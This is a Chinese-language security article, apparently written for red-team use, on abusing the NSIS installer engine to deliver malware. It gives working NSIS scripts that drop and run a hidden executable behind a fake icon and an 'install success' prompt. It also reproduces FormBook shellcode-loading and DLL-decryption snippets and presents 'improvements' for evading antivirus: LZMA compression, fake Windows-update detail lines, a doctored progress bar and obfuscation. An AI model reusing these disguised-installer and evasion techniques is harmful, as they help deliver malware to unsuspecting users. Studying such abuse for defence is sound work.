## 简介

NSIS（Nullsoft Scriptable Install
System）是一个windows平台上合法的安装程序生成引擎，可以将安装的所需的文件打包到一个exe安装程序中。NSIS是一个”脚本化“的生成引擎，可直接由用户编辑的脚本生成exe格式的安装程序。NSIS脚本中提供的内部API可以完成如注册表操作、文件操作、进程操作等敏感操作，甚至可以方便地直接调用windows
API。这种灵活而强大的特性导致其被攻击者滥用以执行恶意代码。恶意软件家族FormBook在进行信息窃取和命令控制时，就曾多次利用过NSIS执行恶意行为，在之前的攻击技术研判中已有介绍。相比单纯的恶意程序，在一个合法的安装程序生成引擎中执行恶意的代码，达到"真中有假,假中有真"的效果。

本文将对NSIS这一脚本化的安装程序生成引擎的利用面进行分析，基于历史在野利用案例，挖掘这项技术在蓝军实战中的应用价值，并从防御规避的角度进行一些攻击手法的改进尝试。

## 脚本利用面分析

 **1 释放并执行文件**

a. File可以打包文件，使用SetOutPath设置安装目录，在安装过程中会释放到指定目录

b.Exec可以执行外部程序，使用该命令执行语句

    
    
    1# set the outfile path   
    2SetOutPath $INSTDIR  
    3# include the Malicious software  
    4File Malicious.exe  
    5# execute the malicious software  
    6Exec "$INSTDIR\Malicious.exe"

 **2 NSIS可调用windows API**

使用System::Call脚本语句调用windows API

    
    
    1System::Call "kernel32::VirtualAlloc(i 0,i 799,i 4096,i 0x40)i.r9"

 **3 调用dll的导出函数**

使用System::Call脚本语句调用dll的导出函数

    
    
    1File YourDLLName.dll  
    2System::Call 'YourDLLName::YourDllFunction(i, *i, t) i(.r0, r1, .r2) .r3'

 **4 伪装图标**

使用Icon脚本语句修改图标，进行伪装

    
    
    1Icon "icon.ico"

## 牛刀小试-编写脚本实现安装器

编译生成伪装图标的恶意安装器，执行后释放恶意exe并执行

 **1 编写NSIS脚本**

编写脚本，使用NSIS实现简单的安装器。实现过程如下:

  1. 设置下载器的文件名

  2. 伪装图标

  3. 设置释放目录

  4. 打包文件并执行

  5. 弹窗显示 ”下载成功“

基本实现脚本如下：

    
    
    1# set the name of the installer   
    2Outfile "Installer.exe"  
    3# set the ico of the installer  
    4Icon "icon.ico"  
    5# create a default section.  
    6Section  
    7# set the outfile path  
    8SetOutPath $INSTDIR  
    9# include the Malicious software  
    10File Malicious.exe  
    11# execute the malicious software  
    12Exec "$INSTDIR\Untitled.exe"  
    13# set a msg box noted "install success"  
    14MessageBox MB_OK "install success"  
    15SectionEnd

如上边的脚本所示，nsis可以通过简单的脚本完成与其他恶意程序相似的文件捆绑行为，并执行。

 **2 手动编译执行**

如下图所示脚本写好后，使用nsis加载完会生成exe程序。

实际效果如下：

![1631862672_61443f90ec0359c66c6d7.png!small?1631862674192](https://image.3001.net/images/20210917/1631862672_61443f90ec0359c66c6d7.png!small?1631862674192)

加载文件成功执行后：

![1631862724_61443fc435c093e898a0d.png!small?1631862725428](https://image.3001.net/images/20210917/1631862724_61443fc435c093e898a0d.png!small?1631862725428)

生成了exe安装器：

![1631862759_61443fe7f17bea95d6808.png!small?1631862761181](https://image.3001.net/images/20210917/1631862759_61443fe7f17bea95d6808.png!small?1631862761181)

执行效果如下：本身NSIS是一个合法的安装器生成工具，因此生成的安装器足够真实，设置图标，设置弹窗显示安装成功，并且释放并执行恶意程序，达到攻击效果。

![1631862794_6144400a452fff67c7a1e.png!small?1631862795469](https://image.3001.net/images/20210917/1631862794_6144400a452fff67c7a1e.png!small?1631862795469)

 **3 命令行执行实现自动化**

mskensis.exe在NSIS中用于执行nsi脚本，生成安装器

    
    
    1makensis [ option | script.nsi | - ] [...]

 **4 利用场景**

NSIS作为安装器生成引擎可以生成各类安装器，因此，可以伪装成各类安装器，实现安装过程，并提示成功，如：补丁安装，程序安装，系统更新安装包等。

例子如下，假装成Google的安装程序：

![1631863066_6144411ac1bae1726a155.png!small?1631863067921](https://image.3001.net/images/20210917/1631863066_6144411ac1bae1726a155.png!small?1631863067921)

## 在野利用手法纵析

 **1 执行shellcode**

在FormBook这一常用于信息窃取和命令控制的商业恶意软件家族中，在早期的样本中有使用NSIS分发恶意代码的行为，以windows
API调用shellcode的二进制文件并执行代码。步骤如下：

  1. 给shellcode分配内存

  2. 使用windows api 创建文件

  3. 修改内存读写属性

  4. 读取文件并调用

    
    
    1Function .onInit  
    2InitPluginsDir  
    3SetOutPath $INSTDIR  
    4File 5e9ikl8w3iif7ipp6  
    5File 3ugs67ip868x5n  
    6File tjdorfrldbgdlq  
    7System::Alloc 1024 ;  
    8Pop $0  
    9System::Call "kernel32::CreateFile(t'$INSTDIR\tjdorfrldbgdlq', i 0x80000000, i 0, p 0, i 3, i 0, i  
    100)i.r10" ;   
    11System::Call "kernel32::VirtualProtect(i r0, i 1024, i 0x40, p0)p.r1" ;   
    12System::Call "kernel32::ReadFile(i r10, i r0, i 1024, t., i 0) i .r3" ;   
    13System::Call ::$0() ; shellcode  
    14Call func_80

 **2 调用DLL导出函数解密执行**

同样，在今年2月份所发现的FormBook的变种NSIS恶意程序中，采用的是更隐匿的方式执行防御规避，在NSIS中含有具有解密功能的恶意dll文件，用于解密加密的payload。解密之后再调用执行，实现恶意行为。步骤如下：

  1. 在NSIS生成的安装器中包含恶意的dll以及加密后的payload。

  2. 在运行过程中执行dll对加密后的payload进行解密并执行，实现恶意行为。

    
    
    1Function .onInit  
    2SetOutPath $INSTDIR  
    3File $INSTDIR\o15bmldpqdxcin.dll ; dll  
    4File $INSTDIR\emvmcmzr.n ;payload  
    5System::Call $INSTDIR\o15bmldpqdxcin.dll::Gxkeoxkzs(w$\"$INSTDIR\emvmcmzr.n$\") ;dll  
    6DetailPrint label ; detail  
    7StrCpy $0 9  
    8IntOp $0 $0 + 4  
    9Goto $0  
    10DetailPrint done  
    11FunctionEnd  
    12

 **3 在NSIS脚本进行数据解密与加载**

更有甚者，不需要解密用的恶意dll，减少了恶意代码在程序中所占的空间，而是直接使用NSIS获取到一块数据与代码块的位置，跳转到代码块的文件，使用该代码进行解密，解密后继续执行解密后的shellcode。

![1631863144_61444168a9636fb686f84.png!small?1631863145889](https://image.3001.net/images/20210917/1631863144_61444168a9636fb686f84.png!small?1631863145889)

步骤如下：

  1. 将加密后的数据文件和代码区载入内存中

  2. 根据加密后的数据文件和代码区之间的偏移量，跳转至代码区

  3. 执行代码区的代码，实现对加密数据文件的解密

  4. 解密后继续执行代码，执行解密后的恶意代码，形成完整的恶意操作

    
    
    1IntOp S2 S2 + 12137 ;offset12137code  
    2Push "::S2(t'')" ;

## 攻击改进

1 改变压缩方式，减少被杀毒软件发现的可能

通过设置压缩算法为LZMA，可以减低被杀毒软件发现的可能

    
    
    1SetCompressor /SOLID lzma   
    2SetCompressorDictSize 8

在部分的杀毒软件中不会被查杀，效果如下：

![1631863193_6144419973a4a00a65dc8.png!small?1631863194628](https://image.3001.net/images/20210917/1631863193_6144419973a4a00a65dc8.png!small?1631863194628)

![1631863215_614441afa1096732b6ac0.png!small?1631863216784](https://image.3001.net/images/20210917/1631863215_614441afa1096732b6ac0.png!small?1631863216784)

 **2 用插件修改进度条的显示，使其更具真实性。**

NSIS是基于脚本命令执行进度而跟进进度条的，为了达到在进度条最后显示"安装成功"的弹窗效果，可以使用脚本/nop指令进行修改。修改前，弹窗出现时，进度条还剩一段：

![1631863246_614441ce814aed0b034af.png!small?1631863247703](https://image.3001.net/images/20210917/1631863246_614441ce814aed0b034af.png!small?1631863247703)

修改后，弹窗出现时，进度条执行到末端：

![1631863279_614441ef6ce4a81a3247d.png!small?1631863280599](https://image.3001.net/images/20210917/1631863279_614441ef6ce4a81a3247d.png!small?1631863280599)

3 安装过程中，对show detail处显示的detail进行修饰伪装，使其更加真实

使用DetailPrint脚本语句，修饰安装过程打印的输出信息，从而达到伪装的效果

    
    
    1DetailPrint " Windows (KB89461)(13)... "  
    2DetailPrint " Windows (KB89231)(23)... "  
    3DetailPrint " Windows (KB89312)(33)... "  
    4DetailPrint "... "  
    5DetailPrint " Windows (KB89461)(13)... "  
    6DetailPrint " Windows (KB89231)(23)... "  
    7DetailPrint " Windows (KB89312)(33)... "

![1631863328_61444220dc9a58fa1bc83.png!small?1631863330073](https://image.3001.net/images/20210917/1631863328_61444220dc9a58fa1bc83.png!small?1631863330073)

 **4 混淆NSIS代码**

在微软的报告中曾经出现过NSIS混淆的方法，利用push和pop实现花指令以及在windows
API中添加混淆字段，并在后边进行函数还原并调用。这种代码混淆方法利用了NSIS脚本语法的灵活性，对基于字符串的静态特征查杀有较好效果。

![1631863600_61444330b35d66d701ac1.png!small?1631863601885](https://image.3001.net/images/20210917/1631863600_61444330b35d66d701ac1.png!small?1631863601885)

## 总结

NSIS对于恶意操作来说是一个常见且有很大的利用空间的利用方式，他有一些对于恶意行为来说很好的优点，如：

  1. 可以直接操作windows API，调用DLL的导出函数、操作进程、文件等。

  2. 脚本语句简单易实现，且有丰富的插件可以使用，安装器生成实现上效率高。

  3. 简单的脚本语句便可以完成恶意程序的伪装和加载，可做出相对真实的安装包形式的钓鱼文件。

  4. 使用加密后的payload和API，以不属于任何一种特定格式的文件，可以规避杀毒软件的静态扫描。

  5. 无论是使用单独的解密dll进行解密还是直接在内存中进行解密，都是规避静态特征检测的好思路。

对于安全攻防研究人员具有一定的参考价值和借鉴意义。

参考

https://nsis.sourceforge.io/Main_Page

http://nsis%20discussion/

https://www.microsoft.com/security/blog/2017/03/15/ransomware-operators-are-hiding-malware-deeper-in-installer-packages/

https://blog.malwarebytes.com/threat-intelligence/2021/05/revisiting-the-nsis-based-crypter/

https://mp.weixin.qq.com/s/bfILTCvuaBASdmWTd4BnoQ

